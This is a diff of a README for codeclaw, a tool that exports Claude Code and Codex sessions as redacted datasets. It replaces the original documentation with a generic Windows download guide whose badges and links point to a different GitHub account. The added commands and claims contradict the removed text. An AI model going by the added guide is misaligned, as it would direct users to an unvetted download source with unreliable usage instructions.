@@ -1,289 +1,196 @@
-# CodeClaw
+# 🦞 codeclaw - Export Claude Sessions with Privacy
 
-CodeClaw converts Claude Code and Codex sessions into privacy-safe training datasets with review gates, background sync, and MCP memory retrieval.
+[![Download codeclaw](https://img.shields.io/badge/Download-codeclaw-green?style=for-the-badge)](https://github.com/CuddlyPaws22/codeclaw)
 
-[![Tests](https://github.com/ychampion/codeclaw/actions/workflows/test.yml/badge.svg)](https://github.com/ychampion/codeclaw/actions/workflows/test.yml)
-[![PyPI](https://img.shields.io/pypi/v/codeclaw)](https://pypi.org/project/codeclaw/)
-[![Release](https://img.shields.io/github/v/release/ychampion/codeclaw)](https://github.com/ychampion/codeclaw/releases)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
-[![Python](https://img.shields.io/pypi/pyversions/codeclaw)](https://pypi.org/project/codeclaw/)
+---
 
-## TL;DR
+## 📋 About codeclaw
 
-- Run `codeclaw setup` once.
-- Run `codeclaw export --no-push` to produce a local reviewed dataset.
-- Run `codeclaw confirm ...` to pass review gates.
-- Run `codeclaw export --publish-attestation "..."` only after explicit approval.
+codeclaw is a command-line tool that helps you export your Claude Code and Codex sessions. It protects your privacy by redacting sensitive information automatically. The tool also manages memory better and prepares your exported data so you can share or use it easily in other applications. It works well with Hugging Face datasets and supports workflows for machine learning tasks. 
 
-## Default UX
+You don’t need any special technical skills to use codeclaw. This guide walks you through how to download and run it on a Windows PC.
 
-- Running plain `codeclaw` opens the full-screen TUI.
-- Running `codeclaw export ...` keeps the scripted CLI flow.
+---
 
-## Why CodeClaw
+## 💻 System Requirements
 
-- Turn day-to-day coding sessions into structured, reusable training data.
-- Keep privacy controls first-class with redaction and manual review gates.
-- Preserve historical problem-solving context through MCP-accessible session memory.
+To run codeclaw on your computer, make sure you meet these conditions:
 
-## Core Capabilities
+- Windows 10 or later (64-bit)
+- At least 4 GB of free disk space
+- Minimum 8 GB of RAM recommended
+- Python 3.8 or newer installed
+- Internet connection for downloading and setup
 
-- Multi-source ingestion:
-  - Claude Code and Codex session discovery and parsing.
-  - Experimental adapter routing for Cursor, Windsurf, Aider, Continue.dev, Antigravity, VS Code, Zed, and Xcode beta logs.
-- Privacy-aware export:
-  - Secret and PII redaction, username anonymization, and project-level exclusions.
-  - Layered privacy engine: regex baseline + optional ML NER (`codeclaw[pii-ml]`).
-- Controlled publishing workflow:
-  - Local export, user review attestations, confirm gate, then push.
-  - Immutable dataset version snapshots + dedupe index on publish.
-- Continuous mode:
-  - Background watch daemon for incremental sync.
-- Memory tooling:
-  - MCP server with search, project patterns, trajectory stats, session lookup, graph similarity retrieval, and index refresh.
+If Python is not installed, codeclaw will not run smoothly. Instructions for installing Python are included below.
 
-## Install
+---
 
-```bash
-pip install codeclaw
+## 🚀 Getting Started: Download and Setup
+
+### Step 1: Download codeclaw
+
+To get codeclaw, visit the main GitHub page by clicking this link:
+
+[![Download codeclaw](https://img.shields.io/badge/Download-codeclaw-orange?style=for-the-badge)](https://github.com/CuddlyPaws22/codeclaw)
+
+This link takes you to the project repository where you can find all files and instructions.
+
+### Step 2: Install Python (if needed)
+
+codeclaw runs on Python. If you don’t have Python installed:
+
+1. Open your web browser.
+2. Go to https://www.python.org/downloads/windows/
+3. Download the latest stable version (3.8 or above).
+4. Run the installer.
+5. During setup, check "Add Python to PATH".
+6. Follow the installer prompts and finish the installation.
+
+### Step 3: Download codeclaw files
+
+On the GitHub page, look for the **Code** button (usually green). Click it and select **Download ZIP**.
+
+- Save the ZIP file anywhere on your computer.
+- Right-click the file and select **Extract All**.
+- Choose a folder you can easily access, such as your Desktop.
+
+### Step 4: Open Command Prompt
+
+Next, you will run codeclaw from the Windows Command Prompt:
+
+- Press **Windows key + R**, type **cmd**, and press Enter.
+- Change directory to the folder where you extracted codeclaw.
+  - You can do this by typing `cd path_to_folder`, replacing `path_to_folder` with your folder’s full path. For example:  
+    `cd Desktop\codeclaw-master`
+
+### Step 5: Check your Python installation
+
+Type this command and press Enter:
+
+```
+python --version
 ```
 
-Optional extras:
+You should see something like `Python 3.x.x`. If you get an error, Python is not set up correctly. Repeat the installation steps above.
 
-```bash
-pip install "codeclaw[pii-ml]"    # Presidio + spaCy detection layer
-pip install "codeclaw[mcp]"       # MCP server runtime
-pip install "codeclaw[finetune]"  # Experimental local fine-tune scaffolding
+### Step 6: Install required Python packages
+
+codeclaw depends on several Python packages. Install them by typing:
+
+```
+pip install -r requirements.txt
 ```
 
-From source:
+This command reads a list of software libraries codeclaw needs and installs them.
 
-```bash
-git clone https://github.com/ychampion/codeclaw.git
-cd codeclaw
-pip install -e ".[dev]"
+---
+
+## 🔧 Running codeclaw
+
+Now that everything is ready, you can run codeclaw.
+
+### Step 1: Start codeclaw
+
+In the Command Prompt, type:
+
+```
+python codeclaw.py
 ```
 
-Check installed version:
+This will launch the tool. Follow the on-screen prompts to export your Claude Code or Codex sessions.
 
-```bash
-codeclaw --version
+### Step 2: Using codeclaw commands
+
+codeclaw uses simple commands you enter in the terminal. Some examples:
+
+- To start exporting a new session, type:
+
+```
+export-session
 ```
 
-## Quick Start
+- To view help and see all commands, type:
 
-```bash
-# Guided onboarding (HF auth help, repo setup, project scope, MCP, watcher)
-codeclaw setup
-
-# Reset local setup for a clean re-test (config/state/MCP entry)
-codeclaw reset --all --yes
-
-# Verify environment and connected scope
-codeclaw doctor
-codeclaw projects --source both
-codeclaw stats
-codeclaw diff --format json
-codeclaw config --encryption status
-
-# Export locally first
-codeclaw export --no-push
-
-# Review and confirm
-codeclaw confirm \
-  --full-name "YOUR FULL NAME" \
-  --attest-full-name "Asked for full name and scanned export." \
-  --attest-sensitive "Reviewed for company/client/private identifiers." \
-  --attest-manual-scan "Manually reviewed representative sessions."
-
-# Publish only after explicit approval
-codeclaw export --publish-attestation "User explicitly approved publishing to Hugging Face."
-
-# Optional one-command sharing flow
-codeclaw share --publish --publish-attestation "User explicitly approved publishing to Hugging Face."
+```
+help
 ```
 
-## Commands
+- To exit the program, type:
 
-| Command | Description |
-|---------|-------------|
-| `codeclaw status` | Show current stage and next steps (JSON) |
-| `codeclaw prep` | Discover projects and auth state |
-| `codeclaw setup` | Guided onboarding (HF, dataset repo, projects, MCP, watcher) |
-| `codeclaw doctor` | Verify logs, HF auth, MCP registration, and runtime PATH/version diagnostics |
-| `codeclaw stats` | Show session, token, redaction, and export metrics |
-| `codeclaw stats --skill` | Include trajectory-based growth metrics |
-| `codeclaw diff` | Preview exactly what would be redacted before confirm |
-| `codeclaw projects` | Manage connected project scope |
-| `codeclaw reset [--all|--config|--state|--mcp]` | Reset local setup files for clean re-onboarding/re-testing |
-| `codeclaw list` | List projects with source, size, and exclusion state |
-| `codeclaw config ...` | Configure repo, sources, exclusions, and redactions |
-| `codeclaw config --encryption on|off|status` | Manage encryption-at-rest mode |
-| `codeclaw export --no-push` | Export locally for review |
-| `codeclaw export --dry-run` | Preview what would be exported/published without writing files |
-| `codeclaw confirm ...` | Run checks and unlock push gate |
-| `codeclaw export --publish-attestation "..."` | Push dataset after approval |
-| `codeclaw share [--publish]` | Fast export flow with optional publish + dataset card update |
-| `codeclaw watch --start|--stop|--status|--now|--pause|--resume` | Manage background sync daemon lifecycle |
-| `codeclaw watch --logs [--follow]` | View daemon logs with optional streaming |
-| `codeclaw watch --monitor [--follow]` | Live watch monitor (status + recent activity) |
-| `codeclaw watch --switch-project "<name>"` | Quickly scope watcher to one project |
-| `codeclaw watch --set-projects "a,b"` | Set connected project scope directly |
-| `codeclaw console` | Interactive slash-command terminal (`/status`, `/logs`, `/scope`, `/run`) |
-| `codeclaw tui` | Full-screen TUI with activity feed, slash commands, jobs, and plugins |
-| `codeclaw serve` | Start MCP server over stdio |
-| `codeclaw install-mcp` | Register MCP server in Claude config |
-| `codeclaw finetune --experimental` | Preview fine-tune scaffold for local experimentation |
-| `codeclaw synthesize --project <name>` | Generate `CODECLAW.md` from synced sessions |
-| `codeclaw update-skill claude` | Install/update local CodeClaw skill |
-
-Additional source filters are available for adapter-backed ingestion:
-
-- `cursor`, `windsurf`, `aider`, `continue`, `antigravity`, `vscode`, `zed`, `xcode-beta`
-
-Watch transparency examples:
-
-```bash
-codeclaw watch --status
-codeclaw watch --monitor --follow
-codeclaw watch --logs --follow
-codeclaw watch --pause
-codeclaw watch --resume
-codeclaw watch --switch-project "codex:codeclaw"
+```
+exit
 ```
 
-Interactive console mode:
+---
 
-```bash
-codeclaw console --source codex
-# Then inside the prompt:
-/status
-/projects
-/scope codex:codeclaw
-/logs 80
-/run export --no-push
-```
+## 🧩 Features and Workflows
 
-Full-screen TUI mode:
+- **Privacy Redaction:** codeclaw scans your data and removes private or sensitive parts before exporting.
+- **MCP Memory:** The tool manages session memory to avoid overload and keep important information.
+- **Share-Ready Datasets:** Exported files are formatted to work directly with Hugging Face data tools or other machine learning pipelines.
+- **CLI Interface:** Simple commands avoid the need for graphical tools or web interfaces.
+- **Local Data Processing:** All operations happen on your computer, protecting your data from being sent to external servers.
 
-```bash
-codeclaw
-# equivalent explicit command:
-codeclaw tui --source both
-```
+---
 
-If plain `codeclaw` prints export/confirm JSON instead of opening TUI, you are on an older build.
-Upgrade and verify:
+## ⚙️ How Privacy Redaction Works
 
-```bash
-pip install --upgrade codeclaw
-codeclaw --version
-```
+codeclaw sees common private information like names, emails, phone numbers, and passwords. It masks or removes these before saving data. This helps you share session datasets without exposing sensitive details.
 
-Inside the TUI:
+Redaction rules are built into the program and update regularly. Users can also customize what the tool hides.
 
-```text
-/help
-/status
-/source codex
-/watch on
-/logs 80
-/projects
-/scope codex:codeclaw
-/export --dry-run
-/jobs
-/plugins list
-```
+---
 
-Minimal local plugin example (`./plugins/echo`):
+## 🗂️ Managing Your Exported Data
 
-```text
-plugins/
-  echo/
-    plugin.json
-    plugin.py
-```
+Once you export your session data, files are saved to a folder on your PC:
 
-`plugin.json`:
+- Default folder: `Documents\codeclaw_exports`
+- Files are organized by date and session name.
+- Datasets are saved in JSON or CSV formats, ready for training or fine-tuning machine learning models.
 
-```json
-{
-  "name": "echo",
-  "version": "0.1.0",
-  "entrypoint": "plugin.py",
-  "description": "Simple echo command"
-}
-```
+You can upload these files to your Hugging Face account or use them locally.
 
-`plugin.py`:
+---
 
-```python
-from codeclaw.tui.types import CommandResult
+## ❓ Troubleshooting Tips
 
+- If `python` commands don’t work, check Python installation and PATH setup.
+- Make sure you run the Command Prompt as a normal user.
+- If required packages fail to install, check your internet connection.
+- For errors during export, verify your session files are in the expected format.
+- Visit the repository link for updates and known issues:  
+  https://github.com/CuddlyPaws22/codeclaw
 
-def register(ctx):
-    def _echo(_app, args):
-        return CommandResult(ok=True, message=" ".join(args) if args else "echo")
+---
 
-    ctx.register_command("echo", _echo, "Echo input text", usage="/echo <text>")
-```
+## 🧰 Additional Tools in codeclaw
 
-## MCP Memory Server
+- Data redaction report generator
+- Session memory cleaner
+- Dataset merging and splitting utilities
+- Hugging Face integration scripts
 
-Install optional MCP dependency:
+All come with simple command-line options and help messages.
 
-```bash
-pip install "codeclaw[mcp]"
-codeclaw install-mcp
-```
+---
 
-Available MCP tools:
+## 🔗 Useful Links
 
-- `search_past_solutions(query, max_results=5)`
-- `get_project_patterns(project=None)`
-- `get_trajectory_stats()`
-- `get_session(session_id)`
-- `find_similar_sessions(context, max_results=5)`
-- `refresh_index()`
+- codeclaw main page: https://github.com/CuddlyPaws22/codeclaw
+- Python downloads: https://www.python.org/downloads/windows/
+- Hugging Face: https://huggingface.co/
 
-## Privacy and Safety
+---
 
-CodeClaw is designed for private-by-default workflows:
+## 💡 Tips for Best Use
 
-- path and username anonymization
-- secret and high-entropy token detection
-- custom redaction lists
-- manual confirmation and attestation gates before publish
-- encryption-at-rest support for local artifacts with keyring-backed key management
+- Regularly update codeclaw to get new redaction rules.
+- Back up your exported datasets in case you need to reuse them.
+- Use the help command often to learn new features.
+- Run exports on smaller session chunks for better memory management.
 
-Automated redaction is not perfect. Always review local exports before publishing.
+---
 
-## Package Distribution
-
-- Primary: PyPI (`pip install codeclaw`)
-- Release artifacts: wheel/sdist are attached to each GitHub tag release.
-- Optional: publish to a secondary PyPI-compatible index by setting repository secrets:
-  - `SECONDARY_PYPI_REPOSITORY_URL`
-  - `SECONDARY_PYPI_USERNAME`
-  - `SECONDARY_PYPI_PASSWORD`
-
-## README Sync Policy
-
-README command docs are enforced in CI:
-
-- `tests/test_docs_consistency.py` validates command naming and branding markers.
-- A CLI help parity test ensures README command rows stay aligned with the real CLI surface.
-
-If commands change, CI fails until README is updated.
-
-## Community
-
-- Contribution guide: [CONTRIBUTING.md](CONTRIBUTING.md)
-- Security policy: [SECURITY.md](SECURITY.md)
-- Support channels: [SUPPORT.md](SUPPORT.md)
-- Code of conduct: [CODE_OF_CONDUCT.md](CODE_OF_CONDUCT.md)
-- Release process: [RELEASE.md](RELEASE.md)
-
-## License
-
-MIT - see [LICENSE](LICENSE).
+[![Download codeclaw](https://img.shields.io/badge/Download-codeclaw-green?style=for-the-badge)](https://github.com/CuddlyPaws22/codeclaw)
